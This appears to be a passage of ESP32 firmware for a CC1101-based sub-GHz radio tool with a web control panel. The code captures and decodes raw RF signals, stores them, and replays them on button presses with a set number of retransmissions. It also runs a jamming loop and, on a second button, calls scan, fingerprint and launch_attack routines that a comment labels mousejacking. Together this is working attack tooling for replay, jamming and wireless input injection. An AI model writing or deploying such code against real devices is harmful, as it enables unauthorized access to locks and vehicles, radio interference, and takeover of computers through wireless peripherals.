          i+= bindata_protocol.substring(i,bindata_protocol.indexOf("]",i)).length();
        }else{
          data_to_send[count_binconvert]+=samplepulse;
        }
      }

      Serial.println("Data to Send");
      for (int i = 0; i<count_binconvert; i++){
        Serial.print(data_to_send[i]);
        Serial.print(",");
      }

      pinMode(2,OUTPUT);
      ELECHOUSE_cc1101.setModul(0);
      ELECHOUSE_cc1101.Init();
      ELECHOUSE_cc1101.setModulation(mod);
      ELECHOUSE_cc1101.setMHZ(frequency);
      ELECHOUSE_cc1101.setDeviation(deviation);
      //delay(400);
      ELECHOUSE_cc1101.SetTx();

      delay(1000);

      for (int i = 0; i<count_binconvert; i+=2){
        digitalWrite(2,HIGH);
        delayMicroseconds(data_to_send[i]);
        digitalWrite(2,LOW);
        delayMicroseconds(data_to_send[i+1]);
      }
     
      request->send(200, "text/html", HTML_CSS_STYLING + "<script>alert(\"Signal has been transmitted\")</script>");
      ELECHOUSE_cc1101.setSidle();
    }
  });

  controlserver.on("/setrx", HTTP_POST, [](AsyncWebServerRequest *request){
    tmp_module = request->arg("module");
    Serial.print("Module: ");
    Serial.println(tmp_module);
    tmp_frequency = request->arg("frequency");
    tmp_setrxbw = request->arg("setrxbw");
    tmp_mod = request->arg("mod");
    tmp_deviation = request->arg("deviation");
    tmp_datarate = request->arg("datarate");
    if (request->hasArg("configmodule")) {
      frequency = tmp_frequency.toFloat();
      setrxbw = tmp_setrxbw.toFloat();
      mod = tmp_mod.toInt();
      Serial.print("Modulation: ");
      Serial.println(mod);
      deviation = tmp_deviation.toFloat();
      datarate = tmp_datarate.toInt();

      if (tmp_module == "1") {
        ELECHOUSE_cc1101.setModul(0);
        Serial.println("Module 1");
      }

      else if (tmp_module == "2") {
        ELECHOUSE_cc1101.setModul(1);
        Serial.println("Module 2");
      }

      ELECHOUSE_cc1101.Init();
      ELECHOUSE_cc1101.setSyncMode(0);        // Combined sync-word qualifier mode. 0 = No preamble/sync. 1 = 16 sync word bits detected. 2 = 16/16 sync word bits detected. 3 = 30/32 sync word bits detected. 4 = No preamble/sync, carrier-sense above threshold. 5 = 15/16 + carrier-sense above threshold. 6 = 16/16 + carrier-sense above threshold. 7 = 30/32 + carrier-sense above threshold.
      ELECHOUSE_cc1101.setPktFormat(3);       // Format of RX and TX data. 0 = Normal mode, use FIFOs for RX and TX. 1 = Synchronous serial mode, Data in on GDO0 and data out on either of the GDOx pins. 2 = Random TX mode; sends random data using PN9 generator. Used for test. Works as normal mode, setting 0 (00), in RX. 3 = Asynchronous serial mode, Data in on GDO0 and data out on either of the GDOx pins.

      ELECHOUSE_cc1101.setModulation(mod);      // set modulation mode. 0 = 2-FSK, 1 = GFSK, 2 = ASK/OOK, 3 = 4-FSK, 4 = MSK.
      ELECHOUSE_cc1101.setRxBW(setrxbw);
      ELECHOUSE_cc1101.setMHZ(frequency);
      ELECHOUSE_cc1101.setDeviation(deviation);   // Set the Frequency deviation in kHz. Value from 1.58 to 380.85. Default is 47.60 kHz.
      ELECHOUSE_cc1101.setDRate(datarate);           // Set the Data Rate in kBaud. Value from 0.02 to 1621.83. Default is 99.97 kBaud!

      enableReceive();
      raw_rx = "1";
      //sdspi.end();
      //sdspi.begin(18, 19, 23, 22);
      //SD.begin(22, sdspi);
      request->send(200, "text/html", HTML_CSS_STYLING + "<script>alert(\"RX Config OK\")</script>");
    }
  });

  controlserver.on("/setbtn", HTTP_POST, [](AsyncWebServerRequest *request){
    btn_set = request->arg("button");
    btn_set_int = btn_set.toInt();
    raw_rx = "0";
    
    if (btn_set_int == 1){
      btn1_rawdata = request->arg("rawdata");
      btn1_deviation = request->arg("deviation");
      btn1_frequency = request->arg("frequency");
      btn1_mod = request->arg("mod");
      btn1_transmission = request->arg("transmissions");
      counter=0;
      int pos = 0;
      for (int i = 0; i<btn1_rawdata.length(); i++){
        if (btn1_rawdata.substring(i, i+1) == ","){
          data_button1[counter]=btn1_rawdata.substring(pos, i).toInt();
          pos = i+1;
          counter++;
        }
      }
    }
    
    if (btn_set_int == 2){
      btn2_rawdata = request->arg("rawdata");
      btn2_deviation = request->arg("deviation");
      btn2_frequency = request->arg("frequency");
      btn2_mod = request->arg("mod");
      btn2_transmission = request->arg("transmissions");
      counter=0;
      int pos = 0;
      for (int i = 0; i<btn2_rawdata.length(); i++){
        if (btn2_rawdata.substring(i, i+1) == ","){
          data_button2[counter]=btn2_rawdata.substring(pos, i).toInt();
          pos = i+1;
          counter++;
        }
      }
    }
    request->send(200, "text/html", HTML_CSS_STYLING + "<script>alert(\"Button Config OK\")</script>");
  });

  controlserver.on("/viewlog", HTTP_GET, [](AsyncWebServerRequest *request){
    request->send(SD, "/logs.txt", "text/html");
  });

  controlserver.on("/cleanspiffs", HTTP_GET, [](AsyncWebServerRequest *request){
    SPIFFS.remove("/");
    request->send(200, "text/html", HTML_CSS_STYLING+ "<body onload=\"JavaScript:AutoRedirect()\">"
    "<br><h2>SPIFFS cleared!<br>You will be redirected in 5 seconds.</h2></body>" );
  });

  controlserver.on("/downloadlog", HTTP_GET, [](AsyncWebServerRequest *request){
    request->send(SD, "/logs.txt", String(), true);
  });

  controlserver.on("/delete", HTTP_GET, [](AsyncWebServerRequest *request){
    deleteFile(SD, "/logs.txt");
    request->send(200, "text/html", HTML_CSS_STYLING+ "<body onload=\"JavaScript:AutoRedirect()\">"
    "<br><h2>File cleared!<br>You will be redirected in 5 seconds.</h2></body>" );
    webString="";
    appendFile(SD, "/logs.txt","Viewlog:\n", "<br>\n");
  });

  controlserver.on("/style.css", HTTP_GET, [](AsyncWebServerRequest *request) {
    request->send(SD, "/HTML/style.css", "text/css");
  });

  controlserver.on("/lib.js", HTTP_GET, [](AsyncWebServerRequest *request) {
    request->send(SD, "/HTML/javascript.js", "text/javascript");
  });

  controlserver.begin();

  ELECHOUSE_cc1101.addSpiPin(14, 12, 13, 5, 0);
  ELECHOUSE_cc1101.addSpiPin(14, 12, 13, 27, 1);
  appendFile(SD, "/logs.txt","Viewlog:\n", "<br>\n");

  //////
  
    pinMode(CS_B, OUTPUT);
    digitalWrite(CS_B, HIGH);

  nspi = new SPIClass(HSPI);
  nspi->begin(HSPI_SCLK, HSPI_MISO, HSPI_MOSI); //SCLK, MISO, MOSI, SS

/////
}

void signalanalyse(){
  #define signalstorage 10

  int signalanz=0;
  int timingdelay[signalstorage];
  float pulse[signalstorage];
  long signaltimings[signalstorage*2];
  int signaltimingscount[signalstorage];
  long signaltimingssum[signalstorage];
  long signalsum=0;

  for (int i = 0; i<signalstorage; i++){
    signaltimings[i*2] = 100000;
    signaltimings[i*2+1] = 0;
    signaltimingscount[i] = 0;
    signaltimingssum[i] = 0;
  }

  for (int i = 1; i<samplecount; i++){
    signalsum+=sample[i];
  }

  for (int p = 0; p<signalstorage; p++){

  for (int i = 1; i<samplecount; i++){
    if (p==0){
      if (sample[i]<signaltimings[p*2]){
        signaltimings[p*2]=sample[i];
      }
    }else{
      if (sample[i]<signaltimings[p*2] && sample[i]>signaltimings[p*2-1]){
        signaltimings[p*2]=sample[i];
      }
    }
  }

  for (int i = 1; i<samplecount; i++){
    if (sample[i]<signaltimings[p*2]+error_toleranz && sample[i]>signaltimings[p*2+1]){
      signaltimings[p*2+1]=sample[i];
    }
  }

  for (int i = 1; i<samplecount; i++){
    if (sample[i]>=signaltimings[p*2] && sample[i]<=signaltimings[p*2+1]){
      signaltimingscount[p]++;
      signaltimingssum[p]+=sample[i];
    }
  }
  }

  signalanz=signalstorage;
  for (int i = 0; i<signalstorage; i++){
    if (signaltimingscount[i] == 0){
      signalanz=i;
      i=signalstorage;
    }
  }

  for (int s=1; s<signalanz; s++){
  for (int i=0; i<signalanz-s; i++){
    if (signaltimingscount[i] < signaltimingscount[i+1]){
      int temp1 = signaltimings[i*2];
      int temp2 = signaltimings[i*2+1];
      int temp3 = signaltimingssum[i];
      int temp4 = signaltimingscount[i];

      signaltimings[i*2] = signaltimings[(i+1)*2];
      signaltimings[i*2+1] = signaltimings[(i+1)*2+1];
      signaltimingssum[i] = signaltimingssum[i+1];
      signaltimingscount[i] = signaltimingscount[i+1];

      signaltimings[(i+1)*2] = temp1;
      signaltimings[(i+1)*2+1] = temp2;
      signaltimingssum[i+1] = temp3;
      signaltimingscount[i+1] = temp4;
    }
  }
  }

  for (int i=0; i<signalanz; i++){
    timingdelay[i] = signaltimingssum[i]/signaltimingscount[i];
  }

  bool lastbin=0;
  for (int i=1; i<samplecount; i++){
    float r = (float)sample[i]/timingdelay[0];
    int calculate = r;
    r = r-calculate;
    r*=10;
    if (r>=5){calculate+=1;}
    if (calculate>0){
      if (lastbin==0){
        lastbin=1;
      }else{
      lastbin=0;
    }
      if (lastbin==0 && calculate>8){
        Serial.print(" [Pause: ");
        Serial.print(sample[i]);
        Serial.println(" samples]");
        appendFile(SD, "/logs.txt",NULL, " [Pause: ");
        appendFileLong(SD, "/logs.txt", sample[i]);
        appendFile(SD, "/logs.txt"," samples]", "\n");
      }else{
        for (int b=0; b<calculate; b++){
          Serial.print(lastbin);
          appendFileLong(SD, "/logs.txt", lastbin);
        }
      }
    }
  }
  appendFile(SD, "/logs.txt","<br>\n", "<br>\n");
  Serial.println();
  Serial.print("Samples/Symbol: ");
  Serial.println(timingdelay[0]);
  Serial.println();
  appendFile(SD, "/logs.txt",NULL, "Samples/Symbol: ");
  appendFileLong(SD, "/logs.txt", timingdelay[0]);
  appendFile(SD, "/logs.txt",NULL, "<br>\n");

  int smoothcount=0;
  for (int i=1; i<samplecount; i++){
    float r = (float)sample[i]/timingdelay[0];
    int calculate = r;
    r = r-calculate;
    r*=10;
    if (r>=5){calculate+=1;}
    if (calculate>0){
      samplesmooth[smoothcount] = calculate*timingdelay[0];
      smoothcount++;
    }
  }
  Serial.println("Rawdata corrected:");
  Serial.print("Count=");
  Serial.println(smoothcount+1);
  appendFile(SD, "/logs.txt",NULL, "Count=");
  appendFileLong(SD, "/logs.txt", smoothcount+1);
  appendFile(SD, "/logs.txt","\n", "<br>\n");
  appendFile(SD, "/logs.txt",NULL, "Rawdata corrected:\n");
  for (int i=0; i<smoothcount; i++){
    Serial.print(samplesmooth[i]);
    Serial.print(",");
    transmit_push[i] = samplesmooth[i];
    appendFileLong(SD, "/logs.txt", samplesmooth[i]);
    appendFile(SD, "/logs.txt", NULL, ",");  
  }
  Serial.println();
  Serial.println();
  appendFile(SD, "/logs.txt", NULL, "<br>\n");
  appendFile(SD, "/logs.txt", "-------------------------------------------------------\n", "<br>");
  return;
}

void loop() {
  pushbutton1 = digitalRead(push1);
  pushbutton2 = digitalRead(push2);

  if(raw_rx == "1") {
    if(checkReceived()){
      printReceived();
      signalanalyse();
      enableReceive();
      delay(200);
      //sdspi.end();
      //sdspi.begin(18, 19, 23, 22);
      //SD.begin(22, sdspi);
      delay(500);
    }
  }

  if(jammer_tx == "1") {
    raw_rx = "0";
    
    if (tmp_module == "1") {
      for (int i = 0; i<12; i+=2){
        digitalWrite(2,HIGH);
        delayMicroseconds(jammer[i]);
        digitalWrite(2,LOW);
        delayMicroseconds(jammer[i+1]);
      }
    }
    else if (tmp_module == "2") {
      for (int i = 0; i<12; i+=2){
        digitalWrite(25,HIGH);
        delayMicroseconds(jammer[i]);
        digitalWrite(25,LOW);
        delayMicroseconds(jammer[i+1]);
      }
    }
  }

  if (pushbutton1 == LOW) {
    raw_rx = "0";
    tmp_btn1_deviation = btn1_deviation.toFloat();
    tmp_btn1_mod = btn1_mod.toInt();
    tmp_btn1_frequency = btn1_frequency.toFloat();
    tmp_btn1_transmission = btn1_transmission.toInt();
    pinMode(25,OUTPUT);
    ELECHOUSE_cc1101.setModul(1);
    ELECHOUSE_cc1101.Init();
    ELECHOUSE_cc1101.setModulation(tmp_btn1_mod);
    ELECHOUSE_cc1101.setMHZ(tmp_btn1_frequency);
    ELECHOUSE_cc1101.setDeviation(tmp_btn1_deviation);
    //delay(400);
    ELECHOUSE_cc1101.SetTx();

    for (int r = 0; r<tmp_btn1_transmission; r++) {
        for (int i = 0; i<counter; i+=2){
          digitalWrite(25,HIGH);
          delayMicroseconds(data_button1[i]);
          digitalWrite(25,LOW);
          delayMicroseconds(data_button1[i+1]);
          Serial.print(data_button1[i]);
          Serial.print(",");
        }
        delay(2000); //Set this for the delay between retransmissions
      }
     Serial.println();
     ELECHOUSE_cc1101.setSidle();
     //sdspi.end();
     //sdspi.begin(18, 19, 23, 22);
     //SD.begin(22, sdspi);
  }

  //delay(500);

  if (pushbutton2 == LOW) {

    //delay(400);

    reset();
  scan();
  fingerprint();
  launch_attack();
  }
//  delay(500);
//    Serial.print("start mousejacking");
//
//    reset();
//  scan();
//  fingerprint();
//  launch_attack();
//      Serial.print("end mousejacking");

}
